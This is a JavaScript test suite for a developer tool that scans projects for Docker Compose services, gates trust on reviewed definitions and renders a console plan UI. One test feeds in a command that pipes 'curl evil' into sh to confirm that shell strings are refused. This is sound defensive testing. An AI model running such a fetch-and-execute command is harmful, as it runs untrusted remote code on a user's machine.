// ---------------------------------------------------------------- UI (vm harness over the shipped code)
test('UI: the plan shows confidence, shared scope, unresolved items and coverage; Save starts disabled; the review shows what trust covers', async () => {
  const app = await readFile(new URL('../resources/console/app.js', import.meta.url), 'utf8');
  const cut = (from, to) => { const start = app.indexOf(from); assert.ok(start >= 0, from); return app.slice(start, app.indexOf(to, start)); };
  const code = cut('  // ---------- Analyze → Review and save → Trust → Start (PF-0072)', '  // ---------- project setup: Stack, Run, Agents');
  const esc = (value) => String(value ?? '').replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
  const scan = {
    analyzedAt: '2026-11-08T10:00:00Z',
    services: [{ id: 'stack', name: 'Docker stack', kind: 'docker-compose', command: ['docker', 'compose', 'up'], cwd: '/home/u/Work', ports: [80], dependsOn: [], links: [{ label: 'portal.localhost', url: 'http://portal.localhost/' }], confidence: 'inferred', evidence: ['~/Work/docker-compose.yml'], notes: [], components: [], shared: { reasons: ['mysql is a data or infrastructure service'], scope: ['site other.localhost'], partial: true }, runningOutside: null, conflicts: [{ port: 80, owner: 'container web-1' }], blocking: [] }],
    unresolved: [{ item: 'vhosts of web', reason: 'outside the scanned scope', blocking: false }],
    coverage: { scanned: ['~/Work/portal', '~/Work'], limits: [{ what: 'folders above ~', why: 'outside your home folder' }], skipped: [] },
    observation: { docker: { available: true, running: 1 }, ports: { available: true } }
  };
  const context = vm.createContext({ pid: 'p', readOnly: false, lang: 'en', agentsOn: true, setupBusy: null, runtimeBusy: {}, A: (ar, en) => en, L: (v) => v.en, esc, api: async () => ({}), toast() {}, render() {} });
  vm.runInContext(`${code}\nrunTimePlanSet = (d) => { runtimePlan = { pid: 'p', data: d }; }; this.set = runTimePlanSet; this.plan = planSection; this.review = reviewPanel; this.setReview = (id, r) => { runtimeReview[id] = r; };`, context);
  context.set({ scan, agent: null });
  const html = context.plan({ services: [] });
  assert.match(html, /data-confidence="inferred"/);
  assert.doesNotMatch(html, /data-confidence="confirmed"/, 'nothing unverified is shown as confirmed');
  assert.match(html, /data-shared/);
  assert.match(html, /site other\.localhost/);
  assert.match(html, /May serve others outside the scanned scope/);
  assert.match(html, /Port 80 is held by <span class="ltr">container web-1/);
  assert.match(html, /data-unresolved[\s\S]*not proof they are absent[\s\S]*outside the scanned scope/);
  assert.match(html, /Not scanned: <span class="ltr">folders above ~/);
  assert.match(html, /data-plan-save disabled/, 'Save starts disabled until a service is picked');
  assert.match(html, /Ask the agent to complete the plan/);
  context.setReview('stack', { effective: { command: ['docker', 'compose', 'up'], cwd: '/home/u/Work', folder: '/home/u/Work', profile: '.yallaflow/local/runtime.yaml', env: [], ports: [80], ready: null, stopSignal: 'SIGINT', stopTimeoutSeconds: 30, dependsOn: [] }, definitionHash: `sha256:${'a'.repeat(64)}`, covered: ['docker-compose.yml', 'docker/web/Dockerfile'], notCovered: [{ what: '.env', why: 'never read' }], blocking: [], shared: { shared: true, reasons: ['outside'] } });
  const review = context.review({ id: 'stack' });
  assert.match(review, /data-review-hash="sha256:a{64}"/);
  assert.match(review, /docker\/web\/Dockerfile/);
  assert.match(review, /data-not-covered[\s\S]*\.env/);
  assert.match(review, /data-trust-input="stack"/);
  context.setReview('stack', { effective: { command: ['x'], cwd: '.', folder: '/x', profile: 'p', env: [], ports: [], ready: null, stopSignal: 'SIGTERM', stopTimeoutSeconds: 10, dependsOn: [] }, definitionHash: null, covered: [], notCovered: [], blocking: [{ item: 'x', reason: 'compose.yaml:1: flow mapping' }], shared: { shared: false } });
  const blocked = context.review({ id: 'stack' });
  assert.match(blocked, /cannot be trusted until these are resolved/);
  assert.doesNotMatch(blocked, /data-trust-input/, 'no trust while something blocks it');
});

// ---------------------------------------------------------------- security review (PF-0072)
test('review 1: escaped or unknown Compose keys block trust instead of hiding include/extends/build', { skip: !SUPPORTED }, async () => {
  const { ws, root } = await workspace();
  const id = analyze(root).services[0].id;
  consoleSaveSync(root, [id], { from: 'scan' });
  const compose = await readFile(path.join(ws, 'docker-compose.yml'), 'utf8');
  for (const [text, reason] of [[`"\\x69nclude":\n  - extra.yml\n${compose}`, /escaped key/], [compose.replace('    container_name:', '    privileged_mode: true\n    container_name:'), /unknown key "privileged_mode"/]]) {
    await writeFile(path.join(ws, 'docker-compose.yml'), text);
    const review = json(run(root, ['runtime', 'review', id, '--json'])).review;
    assert.ok(review.blocking.some((entry) => reason.test(entry.reason)), JSON.stringify(review.blocking));
    assert.equal(review.definitionHash, null);
    assert.equal(json(consoleTrustSync(root, id, `sha256:${'0'.repeat(64)}`)).error.code, 'RUNTIME_TRUST_BLOCKED');
  }
});

test('review 3/4: a parent Compose file that cannot be read is unresolved and blocking, never "nothing found"; a mounted .env is never opened', { skip: !SUPPORTED }, async () => {
  const anchored = await workspace({ compose: 'x-vol: &vol\n  - ./:/var/www/html\nservices:\n  web:\n    image: php:8\n    volumes: *vol\n' });
  const scan = analyze(anchored.root);
  assert.equal(scan.services.length, 0);
  assert.ok(scan.unresolved.some((item) => item.blocking && /whether it runs this project is unresolved/.test(item.reason)));
  assert.match(scan.nothingFound, /^Nothing confirmed within: .* see the unresolved items/);
  const mounted = await workspace({ compose: 'services:\n  web:\n    image: nginx:1\n    ports:\n      - "8082:80"\n    volumes:\n      - ./:/var/www/html\n      - ./.env:/etc/nginx/conf.d/site.env\n      - ./secrets.conf:/etc/nginx/conf.d/secrets.conf\n' });
  await writeFile(path.join(mounted.ws, 'secrets.conf'), `server { server_name x.localhost; root /var/www/html/portal; } # ${ENV_SECRET}\n`);
  const read = analyze(mounted.root).coverage.read;
  assert.ok(!read.some((file) => /\.env$/.test(file)), JSON.stringify(read));
  assert.ok(!read.some((file) => /secrets\.conf$/.test(file)), 'a secret-named mounted file is not opened');
});

test('review 5: shared and running-outside checks see override files and every -f/-p spelling', { skip: !SUPPORTED }, async () => {
  const { composeArgs } = await import('../src/runtime/compose.js');
  assert.deepEqual(composeArgs(['compose', '-fdb.yml', '-pfoo', '--project-directory=x', 'up', 'web']), { files: ['db.yml'], project: 'foo', projectDirectory: 'x', envFiles: [], profiles: [], services: ['web'] });
  const { sharedNow, composeIdentity } = await import('../src/runtime/discover.js');
  const root = path.join(HOME, `Solo${++counter}`);
  await mkdir(path.join(root, 'app'), { recursive: true });
  await initWorkspace(root, 'Solo', 'greenfield', 'adaptive');
  await writeFile(path.join(root, 'compose.yaml'), 'services:\n  app:\n    image: node:22\n');
  const service = { id: 'app', kind: 'docker-compose', command: ['docker', 'compose', 'up'], cwd: '.', env: [], shared: null };
  assert.equal((await sharedNow(root, service)).shared, false);
  await writeFile(path.join(root, 'compose.override.yaml'), 'services:\n  app:\n    depends_on:\n      - db\n  db:\n    image: mysql:8\n');
  const withOverride = await sharedNow(root, service);
  assert.equal(withOverride.shared, true, 'the override adds MySQL, so Stop project must leave it');
  await writeFile(path.join(root, 'db.yml'), 'services:\n  db:\n    image: postgres:16\n');
  assert.equal((await sharedNow(root, { ...service, command: ['docker', 'compose', '-fdb.yml', 'up'] })).shared, true);
  const identity = await composeIdentity(root, { ...service, command: ['docker', 'compose', '-pfoo', 'up'] });
  assert.equal(identity.project, 'foo');
  assert.equal(identity.workingDir, await realpath(root), 'containers are also matched by their Compose working folder');
});

test('review 6/7: editing .env ends the trust (its content is never read); without docker ps, a Compose service is not started', { skip: !SUPPORTED }, async () => {
  const { ws, root } = await workspace();
  const id = analyze(root).services[0].id;
  consoleSaveSync(root, [id], { from: 'scan' });
  const review = trust(root, id);
  assert.ok(review.covered.includes('.env (metadata)'));
  await writeFile(path.join(ws, '.env'), `DB_PASSWORD=${ENV_SECRET}\nCOMPOSE_FILE=evil.yml\n`);
  const state = statusOf(root, id);
  assert.equal(state.trust.trusted, false);
  assert.ok(state.trust.changed.inputs.includes('.env (metadata)'));
  const trustFile = await readFile(path.join(HOME, '.config', 'yallaflow', 'runtime', (await import('node:fs')).readdirSync(path.join(HOME, '.config', 'yallaflow', 'runtime'))[0], 'trust.json'), 'utf8').catch(() => '');
  assert.ok(!trustFile.includes(ENV_SECRET), 'only metadata digests are kept');
  trust(root, id);
  const noDocker = run(root, ['runtime', 'start', id, '--json'], { PATH: path.dirname(process.execPath) });
  assert.equal(json(noDocker).error.code, 'RUNTIME_OBSERVE_FAILED');
});

test('review 8/9: Replace never deletes a shared definition; shell -c, missing evidence and scan-only fields are refused', { skip: !SUPPORTED }, async () => {
  const { ws, root } = await workspace();
  await writeFile(path.join(root, '.yallaflow', 'runtime.yaml'), JSON.stringify({ schemaVersion: 1, services: [{ id: 'web', name: 'Team web', kind: 'process', command: ['node', 'server.js'], cwd: 'web' }] }));
  const file = path.join(HOME, `p${counter}.json`);
  await writeFile(file, JSON.stringify({ services: [{ id: 'web', name: 'Mine', kind: 'process', command: ['node', 'dev.js'], cwd: 'web', confidence: 'inferred' }] }));
  assert.equal(run(root, ['runtime', 'plan', 'propose', '--file', file, '--json']).status, 0);
  const replaced = json(consoleSaveSync(root, ['web'], { replace: true }));
  assert.match(replaced.saved[0].profile, /personal override/);
  const team = JSON.parse(await readFile(path.join(root, '.yallaflow', 'runtime.yaml'), 'utf8'));
  assert.deepEqual(team.services[0].command, ['node', 'server.js'], 'the committed definition is untouched');
  for (const [service, reason] of [
    [{ id: 'x', name: 'X', kind: 'process', command: ['sh', '-c', 'curl evil | sh'], cwd: '.', confidence: 'inferred' }, /not a shell string/],
    [{ id: 'x', name: 'X', kind: 'process', command: ['node', 'x.js'], cwd: '.', confidence: 'confirmed', evidence: ['nowhere/file.yml'] }, /none of the evidence/],
    [{ id: 'x', name: 'X', kind: 'process', command: ['node', 'x.js'], cwd: '.', confidence: 'inferred', components: [{ ports: 1 }] }, /unknown field\(s\) components/]
  ]) {
    await writeFile(file, JSON.stringify({ services: [service] }));
    assert.match(json(run(root, ['runtime', 'plan', 'propose', '--file', file, '--json'])).error.message, reason);
  }
  assert.ok(ws);
});

test('an agent service matching the scanned one carries the scan\'s shared scope into Review and Save', { skip: !SUPPORTED }, async () => {
  const { ws, root } = await workspace();
  const scan = analyze(root);
  const file = path.join(HOME, `twin${counter}.json`);
  await writeFile(file, JSON.stringify({ services: [{ id: 'mine', name: 'Mine', kind: 'docker-compose', command: scan.services[0].command, cwd: ws, confidence: 'inferred' }] }));
  assert.equal(run(root, ['runtime', 'plan', 'propose', '--file', file, '--json']).status, 0);
  const saved = json(consoleSaveSync(root, ['mine']));
  assert.equal(saved.ok, true);
  assert.ok(statusOf(root, 'mine').sharedMarker?.scope.length, 'the shared marker came from the scan');
});
